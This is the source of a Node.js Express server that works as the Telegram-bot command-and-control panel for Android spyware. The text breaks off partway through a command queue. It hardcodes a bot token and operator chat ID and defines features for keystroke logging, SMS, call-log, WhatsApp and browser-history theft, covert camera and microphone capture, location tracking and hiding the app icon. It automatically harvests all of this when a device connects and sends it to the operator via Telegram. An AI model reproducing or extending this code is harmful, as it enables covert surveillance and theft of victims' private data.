const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Auto-collection flags
const autoDataRequested = new Map();

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= DEVICE CONFIGURATION =============
const deviceConfigs = {
    'default': {
        chatId: '5326373447',
        config: {
            chatId: '5326373447',
            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
            serverUrl: 'https://edu-hwpy.onrender.com',
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: true,
            autoRecording: true,
            screenshotQuality: 70,
            recordingQuality: 'MEDIUM',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.whatsapp',
                'com.instagram.android',
                'com.facebook.katana',
                'com.snapchat.android',
                'com.google.android.youtube',
                'com.google.android.apps.maps',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true,
                sms: true,
                callLogs: true,
                location: true,
                screenshots: true,
                recordings: true,
                keystrokes: true,
                notifications: true,
                appOpens: true,
                ipInfo: true,
                phoneInfo: true,
                wifiInfo: true,
                mobileInfo: true,
                simInfo: true
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024,
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// ============= DEVICE MANAGEMENT FUNCTIONS =============

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{
            text: `${status}${device.name} (${lastSeen})`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    
    return keyboard;
}

function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'}`;
    }

    return [
        [
            { text: '📱 Device Info', callback_data: 'menu_device_info' },
            { text: '📞 Phone Info', callback_data: 'menu_phone_info' }
        ],
        [
            { text: '📍 Tracking', callback_data: 'menu_tracking' },
            { text: '🌐 Network', callback_data: 'menu_network' }
        ],
        [
            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
            { text: '🎤 Recording', callback_data: 'menu_recording' }
        ],
        [
            { text: '📸 Camera', callback_data: 'menu_camera' },
            { text: '💬 Social', callback_data: 'menu_social' }
        ],
        [
            { text: '📁 Media', callback_data: 'menu_media' },
            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
        ],
        [
            { text: '⚙️ Services', callback_data: 'menu_services' },
            { text: deviceStatus, callback_data: 'menu_devices' }
        ],
        [
            { text: '🆕 NEW FEATURES', callback_data: 'menu_new_features' },
            { text: '❌ Close', callback_data: 'close_menu' }
        ]
    ];
}

// ============= NEW MENU FUNCTIONS =============

function getNewFeaturesKeyboard() {
    return [
        [
            { text: '📊 Detailed Exports', callback_data: 'menu_detailed_exports' },
            { text: '🔍 File Scanner', callback_data: 'menu_file_scanner' }
        ],
        [
            { text: '📡 Data Saving', callback_data: 'menu_data_saving' },
            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }
        ],
        [
            { text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' },
            { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
        ],
        [
            { text: '📱 App Opens', callback_data: 'menu_app_opens' },
            { text: '📅 Calendar', callback_data: 'menu_calendar' }
        ],
        [
            { text: '📋 Clipboard', callback_data: 'menu_clipboard' },
            { text: '🌐 Browser History', callback_data: 'menu_browser_history' }
        ],
        [
            { text: '◀️ Back to Main', callback_data: 'help_main' }
        ]
    ];
}

function getDetailedExportsKeyboard() {
    return [
        [
            { text: '📇 Detailed Contacts', callback_data: 'cmd:contacts_detailed' },
            { text: '📱 Detailed Apps', callback_data: 'cmd:apps_detailed' }
        ],
        [
            { text: '⌨️ Detailed Keystrokes', callback_data: 'cmd:keystrokes_detailed' },
            { text: '🔔 Detailed Notifications', callback_data: 'cmd:notifications_detailed' }
        ],
        [
            { text: '📊 Device Snapshots', callback_data: 'cmd:device_snapshots' },
            { text: '📈 Device History', callback_data: 'cmd:device_history' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getFileScannerKeyboard() {
    return [
        [
            { text: '🔍 Full System Scan', callback_data: 'cmd:full_scan' },
            { text: '🎵 Media Only Scan', callback_data: 'cmd:media_scan' }
        ],
        [
            { text: '🔬 Deep Scan (Detailed)', callback_data: 'cmd:full_scan_detailed' },
            { text: '🎤 Find Recordings', callback_data: 'cmd:find_recorded' }
        ],
        [
            { text: '📁 Find All Media', callback_data: 'cmd:find_media' },
            { text: '❓ Scan Help', callback_data: 'cmd:scan_help' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getDataSavingKeyboard() {
    return [
        [
            { text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' },
            { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }
        ],
        [
            { text: '🌐 Network Status', callback_data: 'cmd:network_status' },
            { text: '📊 WiFi-Only Status', callback_data: 'cmd:wifi_only_status' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getAudioQualityKeyboard() {
    return [
        [
            { text: '🎤 Ultra Low (8k)', callback_data: 'cmd:audio_ultra' },
            { text: '🎤 Very Low (16k)', callback_data: 'cmd:audio_very_low' }
        ],
        [
            { text: '🎤 Low (24k)', callback_data: 'cmd:audio_low' },
            { text: '🎤 Medium (32k)', callback_data: 'cmd:audio_medium' }
        ],
        [
            { text: '🎤 High (64k)', callback_data: 'cmd:audio_high' },
            { text: 'ℹ️ Audio Info', callback_data: 'cmd:audio_info' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getSyncHarvestKeyboard() {
    return [
        [
            { text: '🔄 Sync All Tables', callback_data: 'cmd:sync_all' },
            { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }
        ],
        [
            { text: '🔄 Refresh Data', callback_data: 'cmd:refresh_data' },
            { text: '📊 Database Stats', callback_data: 'cmd:stats' }
        ],
        [
            { text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' },
            { text: '📊 Logs Count', callback_data: 'cmd:logs_count' }
        ],
        [
            { text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' },
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getRealtimeAdvancedKeyboard() {
    return [
        [
            { text: '🔑 Realtime Keys ON', callback_data: 'cmd:realtime_keystrokes_on' },
            { text: '🔑 Realtime Keys OFF', callback_data: 'cmd:realtime_keystrokes_off' }
        ],
        [
            { text: '🔔 Realtime Notif ON', callback_data: 'cmd:realtime_notifications_on' },
            { text: '🔔 Realtime Notif OFF', callback_data: 'cmd:realtime_notifications_off' }
        ],
        [
            { text: '✅ All Realtime ON', callback_data: 'cmd:realtime_all_on' },
            { text: '❌ All Realtime OFF', callback_data: 'cmd:realtime_all_off' }
        ],
        [
            { text: '📊 Realtime Status', callback_data: 'cmd:realtime_status' },
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getAppOpensKeyboard() {
    return [
        [
            { text: '📱 App Opens (JSON)', callback_data: 'cmd:app_opens' },
            { text: '📱 App Opens (HTML)', callback_data: 'cmd:app_opens_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getCalendarKeyboard() {
    return [
        [
            { text: '📅 Calendar Events', callback_data: 'cmd:calendar' },
            { text: '📅 Calendar (HTML)', callback_data: 'cmd:calendar_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getClipboardKeyboard() {
    return [
        [
            { text: '📋 Clipboard Logs', callback_data: 'cmd:clipboard' },
            { text: '📋 Clipboard (HTML)', callback_data: 'cmd:clipboard_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

function getBrowserHistoryKeyboard() {
    return [
        [
            { text: '🌐 Browser History', callback_data: 'cmd:browser_history' },
            { text: '🌐 Browser History (HTML)', callback_data: 'cmd:browser_history_html' }
        ],
        [
            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
        ]
    ];
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        // COMPLETE COMMAND LIST - ALL 95+ COMMANDS FROM APP
        const commands = [
            // ============ BASIC COMMANDS ============
            { command: 'help', description: '📋 Show main menu' },
            { command: 'menu', description: '📋 Alias for help' },
            { command: 'start', description: '🚀 Start the bot' },
            { command: 'devices', description: '📱 List all devices' },
            { command: 'select', description: '🎯 Select active device' },
            
            // ============ DEVICE INFO ============
            { command: 'status', description: '📊 Device status' },
            { command: 'info', description: 'ℹ️ Device information' },
            { command: 'time', description: '🕐 Current time' },
            { command: 'battery', description: '🔋 Battery status' },
            { command: 'storage', description: '💾 Storage info' },
            
            // ============ LOCATION & TRACKING ============
            { command: 'location', description: '📍 Get GPS location' },
            { command: 'keystrokes', description: '⌨️ Get keystrokes' },
            { command: 'notifications', description: '🔔 Get notifications' },
            { command: 'app_opens', description: '📱 Show app opens' },
            
            // ============ SCREENSHOT COMMANDS ============
            { command: 'screenshot', description: '📸 Take screenshot now' },
            { command: 'screenshot_now', description: '📸 Alias for screenshot' },
            { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
            { command: 'screenshots', description: '📸 View screenshot history' },
            { command: 'screenshot_logs', description: '📸 Alias for screenshots' },
            { command: 'start_screenshot', description: '▶️ Start screenshot service' },
            { command: 'stop_screenshot', description: '⏹️ Stop screenshot service' },
            { command: 'size_status', description: '📏 Check screenshot size' },
            { command: 'small', description: '📏 Small size (30%)' },
            { command: 'medium', description: '📏 Medium size (70%)' },
            { command: 'original', description: '📏 Original size' },
            { command: 'target_apps', description: '📱 List target apps' },
            { command: 'add_target', description: '➕ Add target app' },
            { command: 'screenshot_method', description: '📸 Check screenshot method' },
            
            // ============ CAMERA COMMANDS ============
            { command: 'photo', description: '📸 Take a photo now' },
            { command: 'takephoto', description: '📸 Alias for photo' },
            { command: 'take_photo', description: '📸 Alias for photo' },
            { command: 'camera', description: '📸 Alias for photo' },
            { command: 'camera_on', description: '📸 Start camera monitoring' },
            { command: 'camera_start', description: '📸 Alias for camera_on' },
            { command: 'camera_off', description: '📸 Stop camera monitoring' },
            { command: 'camera_stop', description: '📸 Alias for camera_off' },
            { command: 'camera_status', description: '📸 Check camera status' },
            { command: 'camera_front', description: '📸 Switch to front camera' },
            { command: 'camera_back', description: '📸 Switch to back camera' },
            { command: 'camera_switch', description: '📸 Toggle cameras' },
            
            // ============ RECORDING COMMANDS ============
            { command: 'record', description: '🎤 Start 60s recording' },
            { command: 'start_recording', description: '🎤 Alias for record' },
            { command: 'stop_recording', description: '⏹️ Stop recording' },
            { command: 'recording_settings', description: '⚙️ Recording settings' },
            { command: 'record_schedule', description: '⏰ View recording schedule' },
            { command: 'record_auto_on', description: '✅ Enable auto schedule' },
            { command: 'record_auto_off', description: '❌ Disable auto schedule' },
            { command: 'record_custom', description: '⚙️ Set custom schedule' },
            
            // ============ AUDIO QUALITY (NEW) ============
            { command: 'audio_info', description: '🎤 Audio quality info' },
            { command: 'audio_ultra', description: '🎤 Ultra low quality (8k)' },
            { command: 'audio_very_low', description: '🎤 Very low quality (16k)' },
            { command: 'audio_low', description: '🎤 Low quality (24k)' },
            { command: 'audio_medium', description: '🎤 Medium quality (32k)' },
            { command: 'audio_high', description: '🎤 High quality (64k)' },
            
            // ============ MEDIA SCANNER (ENHANCED) ============
            { command: 'find_media', description: '🔍 Scan for media files' },
            { command: 'scan_media', description: '🔍 Alias for find_media' },
            { command: 'media_scan', description: '🔍 Alias for find_media' },
            { command: 'find_recorded', description: '🔍 Find recordings' },
            { command: 'find_recordings', description: '🔍 Alias for find_recorded' },
            { command: 'scan_recordings', description: '🔍 Alias for find_recorded' },
            { command: 'scan_recording', description: '🔍 Alias for find_recorded' },
            { command: 'full_scan', description: '🔍 Full system scan (all files)' },
            { command: 'full_scan_detailed', description: '🔬 Detailed system scan with paths' },
            { command: 'scan_help', description: '❓ Scan commands help' },
            
            // ============ SOCIAL MEDIA ============
            { command: 'whatsapp', description: '💬 Get WhatsApp logs' },
            { command: 'whatsapp_logs', description: '💬 Alias for whatsapp' },
            { command: 'telegram', description: '💬 Get Telegram logs' },
            { command: 'telegram_logs', description: '💬 Alias for telegram' },
            { command: 'facebook', description: '💬 Get Facebook logs' },
            { command: 'messenger', description: '💬 Alias for facebook' },
            { command: 'facebook_logs', description: '💬 Alias for facebook' },
            { command: 'browser_history', description: '🌐 Get browser history' },
            { command: 'browser_logs', description: '🌐 Alias for browser_history' },
            { command: 'browser_history_html', description: '🌐 Browser history as HTML' },
            { command: 'clipboard', description: '📋 Get clipboard logs' },
            { command: 'clipboard_logs', description: '📋 Alias for clipboard' },
            { command: 'clipboard_html', description: '📋 Clipboard as HTML' },
            
            // ============ CALENDAR ============
            { command: 'calendar', description: '📅 Get calendar events' },
            { command: 'calendar_events', description: '📅 Alias for calendar' },
            { command: 'calendar_html', description: '📅 Calendar as HTML' },
            
            // ============ PHONE INFO ============
            { command: 'phone_number', description: '📞 Get phone number' },
            { command: 'phone', description: '📞 Alias for phone_number' },
            { command: 'myphone', description: '📞 Alias for phone_number' },
            { command: 'sim_info', description: '📱 Get SIM info' },
            { command: 'sim', description: '📱 Alias for sim_info' },
            { command: 'mobile_info', description: '📱 Get mobile data info' },
            { command: 'mobile_data', description: '📱 Alias for mobile_info' },
            { command: 'mobile', description: '📱 Alias for mobile_info' },
            { command: 'calllogs', description: '📞 Get call logs' },
            { command: 'calls', description: '📞 Alias for calllogs' },
            { command: 'sms', description: '💬 Get SMS messages' },
            { command: 'contacts', description: '📇 Get contacts' },
            
            // ============ NETWORK INFO ============
            { command: 'ip_info', description: '🌐 Get IP info' },
            { command: 'ip', description: '🌐 Alias for ip_info' },
            { command: 'wifi_info', description: '📶 Get WiFi info' },
            { command: 'wifi', description: '📶 Alias for wifi_info' },
            { command: 'network', description: '📡 Network status' },
            { command: 'all_info', description: '🌍 Complete network info' },
            { command: 'full_info', description: '🌍 Alias for all_info' },
            { command: 'network_status', description: '📡 Network & data saving status' },
            { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
            { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
            { command: 'wifi_only_status', description: '📡 Show WiFi-only mode status' },
            
            // ============ APPS ============
            { command: 'apps', description: '📱 Get installed apps' },
            { command: 'app_opens_html', description: '📱 App opens as HTML' },
            
            // ============ HTML EXPORTS ============
            { command: 'contacts_html', description: '📇 Contacts as HTML' },
            { command: 'sms_html', description: '💬 SMS as HTML' },
            { command: 'calllogs_html', description: '📞 Call logs as HTML' },
            { command: 'calls_html', description: '📞 Alias for calllogs_html' },
            { command: 'apps_html', description: '📱 Apps as HTML' },
            { command: 'keystrokes_html', description: '⌨️ Keystrokes as HTML' },
            { command: 'browser_history_html', description: '🌐 Full browser history HTML' },
            
            // ============ DETAILED EXPORTS (NEW) ============
            { command: 'contacts_detailed', description: '📇 Detailed contacts (JSON)' },
            { command: 'keystrokes_detailed', description: '⌨️ Detailed keystrokes (HTML)' },
            { command: 'notifications_detailed', description: '🔔 Detailed notifications (HTML)' },
            { command: 'apps_detailed', description: '📱 Detailed apps info (HTML)' },
            { command: 'installed_apps_detailed', description: '📱 Alias for apps_detailed' },
            { command: 'device_snapshots', description: '📊 Device history (HTML)' },
            { command: 'device_history', description: '📊 Alias for device_snapshots' },
            
            // ============ SYNC COMMANDS (NEW) ============
            { command: 'sync_all', description: '🔄 Sync all data' },
            { command: 'sync_all_new', description: '🔄 Sync all new tables' },
            { command: 'force_harvest', description: '⚡ Force data harvest' },
            { command: 'refresh_data', description: '🔄 Refresh all data' },
            { command: 'refresh', description: '🔄 Alias for refresh' },
            { command: 'stats', description: '📈 Database statistics' },
            { command: 'logs_count', description: '📊 Count logs in database' },
            { command: 'clear_logs', description: '🗑️ Clear database' },
            { command: 'reboot_app', description: '🔄 Restart all services' },
            
            // ============ REALTIME CONTROLS (ENHANCED) ============
            { command: 'realtime_on', description: '🔔 Enable real-time logs' },
            { command: 'realtime_off', description: '🔕 Disable real-time logs' },
            { command: 'realtime_status', description: '📊 Check real-time status' },
            { command: 'realtime_keystrokes_on', description: '🔑 Enable real-time keystrokes' },
            { command: 'realtime_keystrokes_off', description: '🔑 Disable real-time keystrokes' },
            { command: 'realtime_notifications_on', description: '🔔 Enable real-time notifications' },
            { command: 'realtime_notifications_off', description: '🔔 Disable real-time notifications' },
            { command: 'realtime_all_on', description: '✅ Enable all real-time logs' },
            { command: 'realtime_all_off', description: '❌ Disable all real-time logs' },
            
            // ============ SERVICE CONTROLS ============
            { command: 'hide_icon', description: '👻 Hide launcher icon' },
            { command: 'show_icon', description: '👁️ Show launcher icon' }
        ];
        
        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
        
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and ${commands.length} commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

function createInlineButton(text, callbackData) {
    return {
        text: text,
        callback_data: callbackData
    };
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= FORMATTER FUNCTIONS =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return { text: locationData };
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

function formatIPInfo(ipData) {
    try {
        let ipInfo = ipData;
        if (typeof ipData === 'string') {
            try {
                ipInfo = JSON.parse(ipData);
            } catch (e) {
                return `🌐 IP Info: ${ipData}`;
            }
        }

        let message = '🌐 <b>Network Information</b>\n\n';
        
        if (ipInfo.publicIP) {
            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
        }
        
        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
        }
        
        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting IP info:', error);
        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
    }
}

function formatSimInfo(simData) {
    try {
        let message = '📱 <b>SIM Information</b>\n\n';
        
        if (Array.isArray(simData)) {
            message += `Active SIMs: ${simData.length}\n\n`;
            simData.forEach((sim, index) => {
                message += `📱 <b>SIM ${index + 1}</b>\n`;
                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
            });
        } else if (simData.operator) {
            message += `• Operator: ${simData.operator}\n`;
            message += `• Country: ${simData.country}\n`;
            message += `• SIM State: ${simData.simState}\n`;
            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting SIM info:', error);
        return `📱 SIM Info: ${JSON.stringify(simData)}`;
    }
}

function formatWifiInfo(wifiData) {
    try {
        let message = '📶 <b>WiFi Information</b>\n\n';
        
        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
        
        if (wifiData.connected) {
            message += `\n📡 <b>Current Connection</b>\n`;
            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting WiFi info:', error);
        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
    }
}

// ============= AUTO DATA COLLECTION =============

function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
        return;
    }
    
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'ip_info',
            'phone_number',
            'sim_info',
            'wifi_info',
            'mobile_info',
            'contacts',
            'contacts_detailed',
            'sms',
            'calllogs',
            'calendar',
            'whatsapp',
            'telegram',
            'facebook',
            'browser_history',
            'clipboard',
            'keystrokes',
            'keystrokes_detailed',
            'notifications',
            'notifications_detailed',
            'screenshots',
            'apps',
            'apps_detailed',
            'device_snapshots',
            'location',
            'screenshot_settings',
            'recording_settings',
            'app_opens'
        ]
    });
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commands = [
        { command: 'ip_info', delay: 0, description: 'IP Address' },
        { command: 'phone_number', delay: 2, description: 'Phone Number' },
        { command: 'sim_info', delay: 4, description: 'SIM Info' },
        { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
        { command: 'mobile_info', delay: 8, description: 'Mobile Info' },
        { command: 'contacts', delay: 12, description: 'Contacts' },
        { command: 'contacts_detailed', delay: 14, description: 'Detailed Contacts' },
        { command: 'sms', delay: 17, description: 'SMS' },
        { command: 'calllogs', delay: 20, description: 'Call Logs' },
        { command: 'calendar', delay: 23, description: 'Calendar' },
        { command: 'whatsapp', delay: 26, description: 'WhatsApp' },
        { command: 'telegram', delay: 29, description: 'Telegram' },
        { command: 'facebook', delay: 32, description: 'Facebook' },
        { command: 'browser_history', delay: 35, description: 'Browser History' },
        { command: 'clipboard', delay: 38, description: 'Clipboard' },
        { command: 'keystrokes', delay: 41, description: 'Keystrokes' },
        { command: 'keystrokes_detailed', delay: 43, description: 'Detailed Keystrokes' },
        { command: 'notifications', delay: 46, description: 'Notifications' },
        { command: 'notifications_detailed', delay: 48, description: 'Detailed Notifications' },
        { command: 'screenshots', delay: 51, description: 'Screenshots' },
        { command: 'apps', delay: 54, description: 'Apps' },
        { command: 'apps_detailed', delay: 56, description: 'Detailed Apps' },
        { command: 'device_snapshots', delay: 59, description: 'Device Snapshots' },
